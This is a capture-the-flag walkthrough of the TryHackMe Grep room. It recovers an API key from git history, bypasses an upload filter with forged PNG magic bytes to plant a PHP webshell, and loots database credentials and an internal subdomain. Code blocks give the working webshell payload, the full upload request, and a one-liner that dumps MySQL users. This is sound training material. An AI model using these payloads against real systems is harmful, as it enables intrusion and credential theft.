## Overview

[Grep](https://tryhackme.com/room/greprtp) is a web box built around a homegrown CMS called SearchME. The API is gated
by a static key, and the whole chain starts by finding that key in the open: the
CMS source is on GitHub, and the key that was supposedly removed from it is still
sitting in the commit history. With a valid key we get past registration, abuse a
sloppy file-upload check with a fake image header to drop a PHP shell, and land as
`www-data`. From there the box hands over database credentials and a second
internal subdomain that holds the final password.

## Enumeration

First instinct was to dir-bust the HTTPS site, which went nowhere:

```text
gobuster dir -u https://10.80.164.214 -w /usr/share/wordlists/dirb/common.txt -r
...
Error: error on running gobuster: unable to connect to https://10.80.164.214/: Get "https://10.80.164.214/": tls: failed to verify certificate: x509: certificate has expired or is not yet valid: current time 2026-08-30T04:30:54Z is after 2024-06-13T13:03:09Z
```

The cert expired back in 2024 and gobuster refuses to talk to it. That's a one-flag
fix with `-k`, but I parked the web content discovery and did a proper port sweep
first — I wanted the full picture before poking at anything.

```text
nmap -T4 10.80.164.214 -p-
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
51337/tcp open  unknown
```

That high port is the interesting one. A service scan on it comes back as plain
Apache:

```text
nmap -T4 10.80.164.214 -p51337 -sV
...
PORT      STATE SERVICE VERSION
51337/tcp open  http    Apache httpd 2.4.41
```

A full `-sC -O` run across the web ports maps them out:

| Port  | Service  | Notes                                             |
|-------|----------|---------------------------------------------------|
| 22    | ssh      | not touched                                       |
| 80    | http     | default Apache "It works" page                    |
| 443   | ssl/http | the real app — redirects to `/public/html/`       |
| 51337 | http     | Apache, `400 Bad Request` on the bare host header |

The `-sC` scripts also pulled the cert off 443, which is where the useful detail
was:

```text
443/tcp open ssl/http Apache httpd 2.4.41
| ssl-cert: Subject: commonName=grep.thm/organizationName=SearchME/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2023-06-14T13:03:09
|_Not valid after:  2024-06-13T13:03:09
| http-title: Welcome
|_Requested resource was /public/html/
```

Two things fell out of the cert and the redirect: the real application lives on
443, and the organisation name is `SearchME` with a hostname of `grep.thm`. Port
51337 answering with a `400` on a plain request smells like it wants a specific
`Host` header — I filed that away for later.

Added the hostname so the app would resolve:

```bash
echo "10.80.164.214 grep.thm" | sudo tee -a /etc/hosts
```

Browsing to `https://grep.thm` gives login and register pages.

## Initial Access

### Finding the API key in git history

Registering an account normally and watching the request in Burp, every API call
carries an `X-Thm-Api-Key` header, and the server throws it straight back:

```json
{"error":"Invalid or Expired API key"}
```

So the browser is shipping a key the backend no longer accepts. Rather than brute
anything, the `SearchME` / `grep.thm` branding was enough to go looking for the
source. A bit of searching turns up what is clearly the same CMS on GitHub:

```text
https://github.com/supersecuredeveloper/searchmecms
```

The repo has the matching `register` and `login` files. The useful part isn't the
current code — it's the history. Pulling up the commit history for
`api/register.php` shows a hardcoded key that a later commit "removed":

```php
if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === '<API_KEY>') {
if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'TBA') {
```

The developer swapped the real value for `TBA` in a later commit but never rotated
it on the server, so the old key is still live.

> The value that was replaced with `TBA` in the diff is the API key the running
> box still honours — and the first THM answer. Deleting a secret in a new commit
> doesn't delete it from history.
{: .prompt-info }

Dropping that key into the `X-Thm-Api-Key` header and sending throwaway
credentials to register gets us a working, authenticated session.

### File upload with a forged magic byte

Authenticated, there's an upload endpoint at `/api/upload.php`. The filter checks
the file's magic bytes rather than the extension, so a bare `.php` gets rejected —
it wants something that looks like a real image. My first stab was to prepend BMP
bytes (`42 4d` = `BM`) with `printf`:

```bash
printf '\x42\x4d<?php system($_GET["cmd"]); ?>' > shell.php
```

That got me thinking about which signature the check actually accepts, and PNG was
the cleaner choice. The trick is the magic bytes have to go in as *raw* bytes, not
the literal text `PNG` — PNG starts with `89 50 4e 47`. In Burp that means editing
the request in hex mode:

```http
POST /api/upload.php HTTP/1.1
Host: grep.thm
Cookie: PHPSESSID=<PHPSESSID>
Referer: https://grep.thm/public/html/dashboard.php
X-Thm-Api-Key: <API_KEY>
Origin: https://grep.thm
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

[89 50 4e 47]<?php system($_GET["cmd"]); ?>
------x--
```

> The `89504e47` has to be entered as real hex bytes in Burp's hex view. Typing the characters `PNG` doesn't match the signature and the upload
> is refused.
{: .prompt-tip }

The server keeps the `.php` extension, so hitting the upload path with a command
runs it:

```text
https://grep.thm/api/uploads/shell.php?cmd=whoami
```

That's our PHP webshell. Confirming who we are:

```text
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Stabilise it with the usual Python TTY trick if you want a real shell.

## Post-Exploitation

### Looting the web root

`www-data` can read a lot it shouldn't. There's a SQL backup under
`/var/www/backup`, and grepping it for the admin row gives the password hash:

```text
www-data@ip-10-80-164-214:/var/www/backup$ cat users.sql | grep admin
-- https://www.phpmyadmin.net/
(2, 'admin', '<ADMIN_HASH>', 'admin@searchme2023cms.grep.thm', 'Admin User', 'admin');
```

`$2y$10$...` is bcrypt, so cracking it offline wasn't attractive. More useful: the
admin's email, `admin@searchme2023cms.grep.thm`, is the next THM answer, and the
hash doesn't need cracking anyway because the live DB creds are right there in the
app config:

```php
www-data@ip-10-80-164-214:/var/www/html/api$ cat config.php
<?php
$host = 'localhost';
$db   = 'postman';
$user = 'root';
$pass = '<DB_PASS>';
$mysqli = new mysqli($host, $user, $pass, $db);
...
```

With root creds to the local MySQL, dumping the users table is a one-liner from the
webshell — no need to pull in a tool:

```bash
php -r '$c=new mysqli("localhost","root","<DB_PASS>","postman"); $r=$c->query("SELECT * FROM users"); while($x=$r->fetch_assoc()) print_r($x);'
```

### The second subdomain

`/etc/hosts` gives away an internal name that never showed up externally:

```text
127.0.0.1 localhost
127.0.0.1 grep.thm leakchecker.grep.thm
```

`leakchecker.grep.thm` is the next answer. Its web root confirms there's something
to reach, but the files themselves are locked down to the `ubuntu` user — `www-data`
can see the listing and nothing more:

```text
www-data@ip-10-80-164-214:/var/www/leakchecker$ ls -la
total 16
drwxr-xr-x 2 ubuntu www-data 4096 Jun 14  2023 .
drwxr-xr-x 6 ubuntu www-data 4096 Jun 14  2023 ..
-r-------- 1 ubuntu ubuntu    440 Jun 14  2023 check_email.php
-r-------- 1 ubuntu ubuntu   1243 Jun  2  2023 index.php
```

We can't read `check_email.php` from the shell, but we don't have to. Remember port
51337 wanting a specific `Host` header? That's where this subdomain is served. Add
`leakchecker.grep.thm` to your local `/etc/hosts` and request the `check_email.php`
endpoint over port 51337 — that page is where the final password lives.

## Conclusion

The chain:

1. **Expired-cert dead end on 443** forced a port sweep, which surfaced the real
   app and the odd `400`-only service on 51337.
2. **API key leaked in git history** — the CMS source on GitHub still carried the
   "removed" `X-Thm-Api-Key` value in an old commit, giving an authenticated
   session.
3. **Magic-byte upload bypass** — the upload filter trusted a forged PNG signature,
   so a `.php` with an `89 50 4e 47` prefix executed as a webshell (`www-data`).
4. **Credentials in the web root** — a SQL backup exposed the admin hash and email,
   and `config.php` handed over live MySQL root creds.
5. **Internal subdomain pivot** — `/etc/hosts` revealed `leakchecker.grep.thm`,
   served on 51337, whose `check_email.php` holds the final password.
